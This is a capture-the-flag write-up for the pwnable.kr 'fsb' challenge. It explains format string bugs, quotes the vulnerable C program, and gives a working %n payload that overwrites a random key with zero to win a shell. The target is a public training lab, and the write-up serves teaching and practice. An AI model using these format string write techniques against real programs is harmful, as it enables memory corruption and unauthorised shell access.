# fsb

## Description

fsb - 20 pt 

> Isn't FSB almost obsolete in computer security? <br>
> Anyway, have fun with it :) <br><br>
> ssh fsb@pwnable.kr -p2222 (pw:guest)

## Solution

### Background

#### Format String Exploits

In C, some functions take "format specifier" as a first argument - a string that tells the function how to parse the other arguments.

Sometimes, programs take user input and give it as the format string to a function, like `prinft`. When they do so they make it possible for the user to leak data (by giving specifiers, such as `%x %d` as their input) or even write data (by utilitzing the `%n` specifier).

### The Challenge


We are given a binary, and the matching source code:

```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
	char* args[]={"/bin/sh", 0};
	int i;

	char*** pargv = &argv;
	char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
	*pargv=0;
	*penvp=0;

	for(i=0; i<4; i++){
		printf("Give me some format strings(%d)\n", i+1);
		read(0, buf, 100);
		printf(buf);
	}

	printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);
        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
	return 0;
}

int main(int argc, char* argv[], char** envp){

	int fd = open("/dev/urandom", O_RDONLY);
	if( fd==-1 || read(fd, &key, 8) != 8 ){
		printf("Error, tell admin\n");
		return 0;
	}
	close(fd);

	alloca(0x12345 & key);

	fsb(argv, envp); // exploit this format string bug!
	return 0;
}
```

The program reads 8 random bytes into the `key` variable. It then allocates a random amount of memory on the stack, and calls the `fsb` function. There, the all the command line arguments and environment variable are nulled out. After that, we are asked 4 times to give format string (of length 100), and they are printed out. Finally, after waiting 3 seconds, the program prompts us to enter the key, and if it matches the random generated key - we are given a shell.


### Exploit

After using leaking some address and playing around with gdb, I found out that the 14th argument (relative to the `printf` call) points to the 20th argument.

And so, if we use the `%n` format specifier, we can write an arbitrary value to the 20th argument - which gives us the following plan:

* write the address of the first 4 bytes of `key` to the 20th argument
* write 0 to the first half of `key`
* repeat but this time on the other half

Yeilding `key` becomming zero.

```
%134520920xAAAAAAAA%14$n
%20$n
%134520920xAAAAAAAAAAAA%14$n
%20$n
0
```

```
Have you ever saw an example of utilizing [n] format character?? :(
```
